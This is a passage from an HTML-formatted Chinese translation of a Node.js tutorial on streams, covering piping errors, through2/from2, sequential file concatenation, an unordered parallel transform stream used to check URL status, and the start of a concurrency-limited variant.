lang=\"javascript\"\u003estream1\n  .pipe(stream2)\n  .on(\u003cspan class=\"hljs-string\"\u003e'error'\u003c/span\u003e, \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{});\n\u003c/code\u003e\u003c/pre\u003e\u003cblockquote\u003e\n\u003cp\u003e在前面的链式调用中，我们将只捕获来自\u003ccode\u003estream2\u003c/code\u003e的错误，这是由于我们给其添加了\u003ccode\u003eerorr\u003c/code\u003e事件侦听器。这意味着，如果我们想捕获从\u003ccode\u003estream1\u003c/code\u003e生成的任何错误，我们必须直接附加另一个错误侦听器。 稍后我们将看到一种可以实现共同错误捕获的另一种模式（合并\u003ccode\u003eStreams\u003c/code\u003e）。 此外，我们应该注意到，如果目标\u003ccode\u003eStreams\u003c/code\u003e（读取的\u003ccode\u003eStreams\u003c/code\u003e）发出错误，它将会对源\u003ccode\u003eStreams\u003c/code\u003e通知一个\u003ccode\u003eerror\u003c/code\u003e，之后导致管道的中断。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch4 class=\"heading\"\u003eStreams如何通过管道\u003c/h4\u003e\n\u003cp\u003e到目前为止，我们创建自定义\u003ccode\u003eStreams\u003c/code\u003e的方式并不完全遵循\u003ccode\u003eNode\u003c/code\u003e定义的模式；实际上，从\u003ccode\u003estream\u003c/code\u003e基类继承是违反\u003ccode\u003esmall surface area\u003c/code\u003e的，并需要一些示例代码。 这并不意味着\u003ccode\u003eStreams\u003c/code\u003e设计得不好，实际上，我们不应该忘记，因为\u003ccode\u003eStreams\u003c/code\u003e是\u003ccode\u003eNode.js\u003c/code\u003e核心的一部分，所以它们必须尽可能地灵活，广泛拓展\u003ccode\u003eStreams\u003c/code\u003e以致于用户级模块能够将它们充分运用。\u003c/p\u003e\n\u003cp\u003e然而，大多数情况下，我们并不需要原型继承可以给予的所有权力和可扩展性，但通常我们想要的仅仅是定义新\u003ccode\u003eStreams\u003c/code\u003e的一种快速开发的模式。\u003ccode\u003eNode.js\u003c/code\u003e社区当然也为此创建了一个解决方案。 一个完美的例子是\u003ca target=\"_blank\" href=\"https://npmjs.org/package/through2\"\u003ethrough2\u003c/a\u003e，一个使得我们可以简单地创建转换的\u003ccode\u003eStreams\u003c/code\u003e的小型库。 通过\u003ccode\u003ethrough2\u003c/code\u003e，我们可以通过调用一个简单的函数来创建一个新的可转换的\u003ccode\u003eStreams\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e transform = through2([options], [_transform], [_flush]);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e类似的，\u003ca target=\"_blank\" href=\"https://npmjs.org/package/from2\"\u003efrom2\u003c/a\u003e也允许我们像下面这样创建一个可读的\u003ccode\u003eStreams\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e readable = from2([options], _read);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接下来，我们将在本章其余部分展示它们的用法，那时，我们会清楚使用这些小型库的好处。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://npmjs.org/package/through\"\u003ethrough\u003c/a\u003e和\u003ca target=\"_blank\" href=\"https://www.npmjs.com/package/from\"\u003efrom\u003c/a\u003e是基于\u003ccode\u003eStream1\u003c/code\u003e规范的顶层库。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch3 class=\"heading\"\u003e基于Streams的异步控制流\u003c/h3\u003e\n\u003cp\u003e通过我们已经介绍的例子，应该清楚的是，\u003ccode\u003eStreams\u003c/code\u003e不仅可以用来处理\u003ccode\u003eI / O\u003c/code\u003e，而且可以用作处理任何类型数据的优雅编程模式。 但优点并不止这些；还可以利用\u003ccode\u003eStreams\u003c/code\u003e来实现异步控制流，在本节将会看到。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e顺序执行\u003c/h4\u003e\n\u003cp\u003e默认情况下，\u003ccode\u003eStreams\u003c/code\u003e将按顺序处理数据；例如，转换的\u003ccode\u003eStreams\u003c/code\u003e的\u003ccode\u003e_transform()\u003c/code\u003e函数在前一个数据块执行\u003ccode\u003ecallback()\u003c/code\u003e之后才会进行下一块数据块的调用。这是\u003ccode\u003eStreams\u003c/code\u003e的一个重要属性，按正确顺序处理每个数据块至关重要，但是也可以利用这一属性将\u003ccode\u003eStreams\u003c/code\u003e实现优雅的传统控制流模式。\u003c/p\u003e\n\u003cp\u003e代码总是比太多的解释要好得多，所以让我们来演示一下如何使用流来按顺序执行异步任务的例子。让我们创建一个函数来连接一组接收到的文件作为输入，确保遵守提供的顺序。我们创建一个名为\u003ccode\u003econcatFiles.js\u003c/code\u003e的新模块，并从其依赖开始：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e fromArray = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'from2-array'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e through = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'through2'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e fs = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们将使用\u003ccode\u003ethrough2\u003c/code\u003e来简化转换的\u003ccode\u003eStreams\u003c/code\u003e的创建，并使用\u003ccode\u003efrom2-array\u003c/code\u003e从一个对象数组中创建可读的\u003ccode\u003eStreams\u003c/code\u003e。\n接下来，我们可以定义\u003ccode\u003econcatFiles()\u003c/code\u003e函数：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003econcatFiles\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003edestination, files, callback\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e destStream = fs.createWriteStream(destination);\n  fromArray.obj(files)             \u003cspan class=\"hljs-comment\"\u003e//[1]\u003c/span\u003e\n    .pipe(through.obj(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003efile, enc, done\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {   \u003cspan class=\"hljs-comment\"\u003e//[2]\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e src = fs.createReadStream(file);\n      src.pipe(destStream, {\u003cspan class=\"hljs-attr\"\u003eend\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e});\n      src.on(\u003cspan class=\"hljs-string\"\u003e'end'\u003c/span\u003e, done); \u003cspan class=\"hljs-comment\"\u003e//[3]\u003c/span\u003e\n    }))\n    .on(\u003cspan class=\"hljs-string\"\u003e'finish'\u003c/span\u003e, () =\u0026gt; {         \u003cspan class=\"hljs-comment\"\u003e//[4]\u003c/span\u003e\n      destStream.end();\n      callback();\n    });\n}\n\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = concatFiles;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e前面的函数通过将\u003ccode\u003efiles\u003c/code\u003e数组转换为\u003ccode\u003eStreams\u003c/code\u003e来实现对\u003ccode\u003efiles\u003c/code\u003e数组的顺序迭代。 该函数所遵循的程序解释如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e首先，我们使用\u003ccode\u003efrom2-array\u003c/code\u003e从\u003ccode\u003efiles\u003c/code\u003e数组创建一个可读的\u003ccode\u003eStreams\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e接下来，我们使用\u003ccode\u003ethrough\u003c/code\u003e来创建一个转换的\u003ccode\u003eStreams\u003c/code\u003e来处理序列中的每个文件。对于每个文件，我们创建一个可读的\u003ccode\u003eStreams\u003c/code\u003e，并通过管道将其输入到表示输出文件的\u003ccode\u003edestStream\u003c/code\u003e中。 在源文件完成读取后，通过在\u003ccode\u003epipe()\u003c/code\u003e方法的第二个参数中指定\u003ccode\u003e{end：false}\u003c/code\u003e，我们确保不关闭\u003ccode\u003edestStream\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e当源文件的所有内容都被传送到\u003ccode\u003edestStream\u003c/code\u003e时，我们调用\u003ccode\u003ethrough.obj\u003c/code\u003e公开的\u003ccode\u003edone\u003c/code\u003e函数来传递当前处理已经完成，在我们的情况下这是需要触发处理下一个文件。\u003c/li\u003e\n\u003cli\u003e所有文件处理完后，\u003ccode\u003efinish\u003c/code\u003e事件被触发。我们最后可以结束\u003ccode\u003edestStream\u003c/code\u003e并调用\u003ccode\u003econcatFiles()\u003c/code\u003e的\u003ccode\u003ecallback()\u003c/code\u003e函数，这个函数表示整个操作的完成。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e我们现在可以尝试使用我们刚刚创建的小模块。让我们创建一个名为\u003ccode\u003econcat.js\u003c/code\u003e的新文件来完成一个示例：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e concatFiles = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'./concatFiles'\u003c/span\u003e);\n\nconcatFiles(process.argv[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e], process.argv.slice(\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e), () =\u0026gt; {\n  \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'Files concatenated successfully'\u003c/span\u003e);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们现在可以运行上述程序，将目标文件作为第一个命令行参数，接着是要连接的文件列表，例如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enode concat allTogether.txt file1.txt file2.txt\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e执行这一条命令，会创建一个名为\u003ccode\u003eallTogether.txt\u003c/code\u003e的新文件，其中按顺序保存\u003ccode\u003efile1.txt\u003c/code\u003e和\u003ccode\u003efile2.txt\u003c/code\u003e的内容。\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003econcatFiles()\u003c/code\u003e函数，我们能够仅使用\u003ccode\u003eStreams\u003c/code\u003e实现异步操作的顺序执行。正如我们在\u003ccode\u003eChapter3 Asynchronous Control Flow Patters with Callbacks\u003c/code\u003e中看到的那样，如果使用纯\u003ccode\u003eJavaScript\u003c/code\u003e实现，或者使用\u003ccode\u003easync\u003c/code\u003e等外部库，则需要使用或实现迭代器。我们现在提供了另外一个可以达到同样效果的方法，正如我们所看到的，它的实现方式非常优雅且可读性高。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e模式：使用Streams或Streams的组合，可以轻松地按顺序遍历一组异步任务。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch4 class=\"heading\"\u003e无序并行执行\u003c/h4\u003e\n\u003cp\u003e我们刚刚看到\u003ccode\u003eStreams\u003c/code\u003e按顺序处理每个数据块，但有时这可能并不能这么做，因为这样并没有充分利用\u003ccode\u003eNode.js\u003c/code\u003e的并发性。如果我们必须对每个数据块执行一个缓慢的异步操作，那么并行化执行这一组异步任务完全是有必要的。当然，只有在每个数据块之间没有关系的情况下才能应用这种模式，这些数据块可能经常发生在对象模式的\u003ccode\u003eStreams\u003c/code\u003e中，但是对于二进制模式的\u003ccode\u003eStreams\u003c/code\u003e很少使用无序的并行执行。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e注意：当处理数据的顺序很重要时，不能使用无序并行执行的Streams。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e为了并行化一个可转换的\u003ccode\u003eStreams\u003c/code\u003e的执行，我们可以运用\u003ccode\u003eChapter3 Asynchronous Control Flow Patters with Callbacks\u003c/code\u003e所讲到的无序并行执行的相同模式，然后做出一些改变使它们适用于\u003ccode\u003eStreams\u003c/code\u003e。让我们看看这是如何更改的。\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e实现一个无序并行的Streams\u003c/h5\u003e\n\u003cp\u003e让我们用一个例子直接说明：我们创建一个叫做\u003ccode\u003eparallelStream.js\u003c/code\u003e的模块，然后自定义一个普通的可转换的\u003ccode\u003eStreams\u003c/code\u003e，然后给出一系列可转换流的方法：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e stream = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'stream'\u003c/span\u003e);\n\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eParallelStream\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003estream\u003c/span\u003e.\u003cspan class=\"hljs-title\"\u003eTransform\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(userTransform) {\n    \u003cspan class=\"hljs-keyword\"\u003esuper\u003c/span\u003e({\u003cspan class=\"hljs-attr\"\u003eobjectMode\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e});\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.userTransform = userTransform;\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.running = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.terminateCallback = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e;\n  }\n\n  _transform(chunk, enc, done) {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.running++;\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.userTransform(chunk, enc, \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e._onComplete.bind(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e), \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.push.bind(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e));\n    done();\n  }\n\n  _flush(done) {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.running \u0026gt; \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.terminateCallback = done;\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n      done();\n    }\n  }\n\n  _onComplete(err) {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.running--;\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(err) {\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.emit(\u003cspan class=\"hljs-string\"\u003e'error'\u003c/span\u003e, err);\n    }\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.running === \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) {\n      \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.terminateCallback \u0026amp;\u0026amp; \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.terminateCallback();\n    }\n  }\n}\n\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = ParallelStream;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们来分析一下这个新的自定义的类。正如你所看到的一样，构造函数接受一个\u003ccode\u003euserTransform()\u003c/code\u003e函数作为参数，然后将其另存为一个实例变量；我们也调用父构造函数，并且我们默认启用对象模式。\u003c/p\u003e\n\u003cp\u003e接下来，来看\u003ccode\u003e_transform()\u003c/code\u003e方法，在这个方法中，我们执行\u003ccode\u003euserTransform()\u003c/code\u003e函数，然后增加当前正在运行的任务个数; 最后，我们通过调用\u003ccode\u003edone()\u003c/code\u003e来通知当前转换步骤已经完成。\u003ccode\u003e_transform()\u003c/code\u003e方法展示了如何并行处理另一项任务。我们不用等待\u003ccode\u003euserTransform()\u003c/code\u003e方法执行完毕再调用\u003ccode\u003edone()\u003c/code\u003e。 相反，我们立即执行\u003ccode\u003edone()\u003c/code\u003e方法。另一方面，我们提供了一个特殊的回调函数给\u003ccode\u003euserTransform()\u003c/code\u003e方法，这就是\u003ccode\u003ethis._onComplete()\u003c/code\u003e方法；以便我们在\u003ccode\u003euserTransform()\u003c/code\u003e完成的时候收到通知。\u003c/p\u003e\n\u003cp\u003e在\u003ccode\u003eStreams\u003c/code\u003e终止之前，会调用\u003ccode\u003e_flush()\u003c/code\u003e方法，所以如果仍有任务正在运行，我们可以通过不立即调用\u003ccode\u003edone()\u003c/code\u003e回调函数来延迟\u003ccode\u003efinish\u003c/code\u003e事件的触发。相反，我们将其分配给\u003ccode\u003ethis.terminateCallback\u003c/code\u003e变量。为了理解\u003ccode\u003eStreams\u003c/code\u003e如何正确终止，来看\u003ccode\u003e_onComplete()\u003c/code\u003e方法。\u003c/p\u003e\n\u003cp\u003e在每组异步任务最终完成时，\u003ccode\u003e_onComplete()\u003c/code\u003e方法会被调用。首先，它会检查是否有任务正在运行，如果没有，则调用\u003ccode\u003ethis.terminateCallback()\u003c/code\u003e函数，这将导致\u003ccode\u003eStreams\u003c/code\u003e结束，触发\u003ccode\u003e_flush()\u003c/code\u003e方法的\u003ccode\u003efinish\u003c/code\u003e事件。\u003c/p\u003e\n\u003cp\u003e利用刚刚构建的\u003ccode\u003eParallelStream\u003c/code\u003e类可以轻松地创建一个无序并行执行的可转换的\u003ccode\u003eStreams\u003c/code\u003e实例，但是有个注意：它不会保留项目接收的顺序。实际上，异步操作可以在任何时候都有可能完成并推送数据，而跟它们开始的时刻并没有必然的联系。因此我们知道，对于二进制模式的\u003ccode\u003eStreams\u003c/code\u003e并不适用，因为二进制的\u003ccode\u003eStreams\u003c/code\u003e对顺序要求较高。\u003c/p\u003e\n\u003ch5 class=\"heading\"\u003e实现一个URL监控应用程序\u003c/h5\u003e\n\u003cp\u003e现在，让我们使用\u003ccode\u003eParallelStream\u003c/code\u003e模块实现一个具体的例子。让我们想象以下我们想要构建一个简单的服务来监控一个大\u003ccode\u003eURL\u003c/code\u003e列表的状态，让我们想象以下，所有的这些\u003ccode\u003eURL\u003c/code\u003e包含在一个单独的文件中，并且每一个\u003ccode\u003eURL\u003c/code\u003e占据一个空行。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eStreams\u003c/code\u003e能够为这个场景提供一个高效且优雅的解决方案。特别是当我们使用我们刚刚写的\u003ccode\u003eParallelStream\u003c/code\u003e类来无序地审核这些\u003ccode\u003eURL\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e接下来，让我们创建一个简单的放在\u003ccode\u003echeckUrls.js\u003c/code\u003e模块的应用程序。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e fs = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e split = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'split'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e request = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'request'\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e ParallelStream = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'./parallelStream'\u003c/span\u003e);\n\nfs.createReadStream(process.argv[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e])         \u003cspan class=\"hljs-comment\"\u003e//[1]\u003c/span\u003e\n  .pipe(split())                             \u003cspan class=\"hljs-comment\"\u003e//[2]\u003c/span\u003e\n  .pipe(\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e ParallelStream(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eurl, enc, done, push\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {     \u003cspan class=\"hljs-comment\"\u003e//[3]\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(!url) \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e done();\n    request.head(url, (err, response) =\u0026gt; {\n      push(url + \u003cspan class=\"hljs-string\"\u003e' is '\u003c/span\u003e + (err ? \u003cspan class=\"hljs-string\"\u003e'down'\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'up'\u003c/span\u003e) + \u003cspan class=\"hljs-string\"\u003e'\\n'\u003c/span\u003e);\n      done();\n    });\n  }))\n  .pipe(fs.createWriteStream(\u003cspan class=\"hljs-string\"\u003e'results.txt'\u003c/span\u003e))   \u003cspan class=\"hljs-comment\"\u003e//[4]\u003c/span\u003e\n  .on(\u003cspan class=\"hljs-string\"\u003e'finish'\u003c/span\u003e, () =\u0026gt; \u003cspan class=\"hljs-built_in\"\u003econsole\u003c/span\u003e.log(\u003cspan class=\"hljs-string\"\u003e'All urls were checked'\u003c/span\u003e))\n;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e正如我们所看到的，通过流，我们的代码看起来非常优雅，直观。 让我们看看它是如何工作的：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e首先，我们通过给定的文件参数创建一个可读的\u003ccode\u003eStreams\u003c/code\u003e，便于接下来读取文件。\u003c/li\u003e\n\u003cli\u003e我们通过\u003ca target=\"_blank\" href=\"https://npmjs.org/package/split\"\u003esplit\u003c/a\u003e将输入的文件的\u003ccode\u003eStreams\u003c/code\u003e的内容输出一个可转换的\u003ccode\u003eStreams\u003c/code\u003e到管道中，并且分隔了数据块的每一行。\u003c/li\u003e\n\u003cli\u003e然后，是时候使用我们的\u003ccode\u003eParallelStream\u003c/code\u003e来检查\u003ccode\u003eURL\u003c/code\u003e了，我们发送一个\u003ccode\u003eHEAD\u003c/code\u003e请求然后等待请求的\u003ccode\u003eresponse\u003c/code\u003e。当请求返回时，我们把请求的结果\u003ccode\u003epush\u003c/code\u003e到\u003ccode\u003estream\u003c/code\u003e中。\u003c/li\u003e\n\u003cli\u003e最后，通过管道把结果保存到\u003ccode\u003eresults.txt\u003c/code\u003e文件中。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003enode checkUrls urlList.txt\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里的文件\u003ccode\u003eurlList.txt\u003c/code\u003e包含一组\u003ccode\u003eURL\u003c/code\u003e，例如：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ehttp://www.mariocasciaro.me/\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ehttp://loige.co/\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ehttp://thiswillbedownforsure.com/\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e当应用执行完成后，我们可以看到一个文件\u003ccode\u003eresults.txt\u003c/code\u003e被创建，里面包含有操作的结果，例如：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ehttp://thiswillbedownforsure.com is down\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ehttp://loige.co is up\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ehttp://www.mariocasciaro.me is up\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e输出的结果的顺序很有可能与输入文件中指定\u003ccode\u003eURL\u003c/code\u003e的顺序不同。这是\u003ccode\u003eStreams\u003c/code\u003e无序并行执行任务的明显特征。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e出于好奇，我们可能想尝试用一个正常的through2流替换ParallelStream，并比较两者的行为和性能（你可能想这样做的一个练习）。我们将会看到，使用through2的方式会比较慢，因为每个URL都将按顺序进行检查，而且文件results.txt中结果的顺序也会被保留。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch4 class=\"heading\"\u003e无序限制并行执行\u003c/h4\u003e\n\u003cp\u003e如果运行包含数千或数百万个URL的文件的\u003ccode\u003echeckUrls\u003c/code\u003e应用程序，我们肯定会遇到麻烦。我们的应用程序将同时创建不受控制的连接数量，并行发送大量数据，并可能破坏应用程序的稳定性和整个系统的可用性。我们已经知道，控制负载的无序限制并行执行是一个极好的解决方案。\u003c/p\u003e\n\u003cp\u003e让我们通过创建一个\u003ccode\u003elimitedParallelStream.js\u003c/code\u003e模块来看看它是如何工作的，这个模块是改编自上一节中创建的\u003ccode\u003eparallelStream.js\u003c/code\u003e模块。\u003c/p\u003e\n\u003cp\u003e让我们看看它的构造函数：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eLimitedParallelStream\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003estream\u003c/span\u003e.\u003cspan class=\"hljs-title\"\u003eTransform\u003c/span\u003e \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003econstructor\u003c/span\u003e(concurrency, userTransform) {\n    \u003cspan class=\"hljs-keyword\"\u003esuper\u003c/span\u003e({\u003cspan class=\"hljs-attr\"\u003eobjectMode\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e});\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.concurrency = concurrency;\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.userTransform = userTransform;\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.running = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.terminateCallback = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.continueCallback = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e;\n  }\n\u003cspan class=\"hljs-comment\"\u003e// ...\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e我们需要一个\u003ccode\u003econcurrency\u003c/code\u003e变量作为输入来限制并发量，这次我们要保存两个回调函数，\u003ccode\u003econtinueCallback\u003c/code\u003e用于任何挂起的\u003ccode\u003e_transform\u003c/code\u003e方法，\u003ccode\u003eterminateCallback\u003c/code\u003e用于_flush方法的回调。\n接下来看\u003ccode\u003e_transform()\u003c/code\u003e方法：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e_transform(chunk, enc, done) {\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.running++;\n  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.userTransform(chunk, enc,  \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.push.bind(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e), \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e._onComplete.bind(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e));\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(\u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.running \u0026lt; \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.concurrency) {\n    done();\n  } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n    \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.continueCallback = done;\n  